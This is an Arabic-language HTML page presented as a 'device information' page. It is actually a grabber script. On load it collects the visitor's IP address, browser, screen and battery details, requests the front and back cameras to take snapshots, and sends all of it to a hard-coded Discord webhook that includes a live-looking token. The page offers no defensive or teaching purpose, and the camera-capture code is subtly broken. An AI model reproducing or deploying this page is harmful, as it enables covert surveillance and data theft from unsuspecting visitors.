<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>معلومات الجهاز</title>
    <style>
        body { margin: 0; padding: 20px; background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
        video, img { width: 300px; height: auto; border: 2px solid #fff; margin: 5px; }
    </style>
</head>
<body>
    <!-- عرض الكاميرات -->
    <div>
        <h3>الكاميرا الأمامية</h3>
        <video id="frontVid" autoplay playsinline muted></video>
        <img id="frontImg" src="" alt="">
    </div>
    <div>
        <h3>الكاميرا الخلفية</h3>
        <video id="backVid" autoplay playsinline muted></video>
        <img id="backImg" src="" alt="">
    </div>

    <script>
        // ضع رابط الويب هوك الخاص بك هنا بدلاً من النص أدناه
        const webhook = "https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb";

        async function send(data) {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
            });
        }

        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                return (await r.json()).ip;
            } catch { return "Unknown"; }
        }

        async function run() {
            let info = {};
            
            // 1. جمع المعلومات النصية
            info.IP = await getIP();
            info.Location = window.location.href; // الموقع الحالي عبر المتصفح
            info.Device = navigator.userAgent;
            info.Language = navigator.language;
            info.Screen = `${screen.width}x${screen.height}`;
            info.Battery = "Checking...";
            info.Time = new Date().toLocaleString();
            
            // محاولة جلب البطارية بدقة
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                info.Battery = `Level: ${(bat.level * 100).toFixed(0)}% | Charging: ${bat.charging}`;
            }

            // 2. التقاط الصور والفيديو
            const camData = async (mode) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: mode }, 
                        audio: false 
                    });
                    
                    // تشغيل الفيديو
                    const vidId = mode === "user" ? "frontVid" : "backVid";
                    document.getElementById(vidId).srcObject = stream;

                    // التقاط صورة ثابتة
                    const canvas = document.createElement('canvas');
                    canvas.width = stream.getVideoTracks()[0].getSettings().width || 640;
                    canvas.height = stream.getVideoTracks()[0].getSettings().height || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(stream.getVideoTracks()[0], 0, 0);
                    
                    // تحويل الصورة إلى بيانات لإرسالها
                    const dataUrl = canvas.toDataURL("image/png");
                    return { stream, image: dataUrl };
                } catch (e) {
                    return { error: e.message };
                }
            };

            const front = await camData("user");
            const back = await camData("environment");

            info.FrontCam_Image = front.image || "Failed";
            info.BackCam_Image = back.image || "Failed";
            info.CameraStatus = `Front: ${front.error ? 'Error' : 'OK'} | Back: ${back.error ? 'Error' : 'OK'}`;

            // إرسال البيانات للويب هوك
            await send(info);
        }

        window.onload = run;
    </script>
</body>
</html>
